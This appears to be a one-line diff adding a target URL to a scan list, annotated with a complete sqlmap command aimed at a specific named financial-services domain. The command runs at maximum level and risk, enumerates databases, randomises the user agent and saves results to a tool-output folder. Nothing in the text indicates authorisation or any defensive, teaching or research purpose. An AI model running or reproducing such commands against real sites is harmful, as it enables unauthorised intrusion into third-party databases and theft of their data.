@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/api/?q=test&id=1&page=2&cb=1&x=1&url=%2Fx.jpg&w=1080 (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/api/?q=test&id=1&page=2&cb=1&x=1&url=%2Fx.jpg&w=1080 --batch --level=5 --risk=3 --dbs --threads=2 --delay=0.3 --random-agent --output-dir=tool_outputs/g_api_
